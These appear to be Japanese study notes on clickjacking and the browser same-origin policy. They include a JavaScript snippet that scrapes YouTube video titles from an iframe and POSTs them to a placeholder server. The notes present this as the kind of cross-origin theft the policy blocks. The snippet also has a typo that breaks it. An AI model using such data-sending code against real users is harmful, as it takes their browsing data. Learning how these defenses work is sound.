
## クリックジャッキングについて
- クリックジャッキング（Clickjacking）は、悪意のあるウェブサイトが透明なレイヤーを使用して、ユーザーが意図しない操作を行わせる攻撃手法。
- 例えば、ユーザーが見ているページの上に透明なボタンやリンクを配置し、ユーザーがそれをクリックすると、実際には別のアクションが実行されるようにする。


## 同一オリジンポリシーとは
- ウェブブラウザが異なるオリジン（ドメイン、プロトコル、ポートの組み合わせ）間でのリソースの共有を制限するセキュリティ機能。
- このポリシーにより、悪意のあるウェブサイトが他のサイトのデータにアクセスすることを防ぐ。
- 例えば、あるウェブサイトが読み込まれた場合、そのサイトのJavaScriptコードは同じオリジンから提供されるリソースにのみアクセスできる。
- 異なるオリジンから提供されるリソースにはアクセスできない。
- よって、下記のコードにおいて、iframeで読み込んでいるYouTubeのコンテンツにアクセスしようとすると、同一オリジンポリシーにより制限され、アクセスが拒否されエラーになる。

```
<iframe id="other" src="https://www.youtube.com/"></iframe>
<script src="./script.js"></script>
...
async () => {
  // YouTube が利用者に推薦する動画タイトルを取得すれば、利用者に最適な商品セットを表示できるのではないか？
  const titles = document
    .getElementById("other")
    .contentWindowquerySelectorAll("#video-title");
  for (const t of titles) {
    await fetch("your-server-path", { method: "POST", body: t.textContent });
  }
};
```

## 同一オリジンポリシーが存在しない場合
- 仮に同一オリジンポリシーが存在しない場合、悪意のあるウェブサイトが他のサイトのデータに自由にアクセスできるようになる。
- 例えば、ユーザーが銀行のウェブサイトにログインしている状態で悪意のあるサイトを訪れた場合、そのサイトが銀行のウェブサイトのデータにアクセスし、ユーザーの口座情報や取引履歴を盗むことが可能になる。
- これにより、個人情報の漏洩や不正な取引などの深刻なセキュリティ問題が発生する可能性がある。
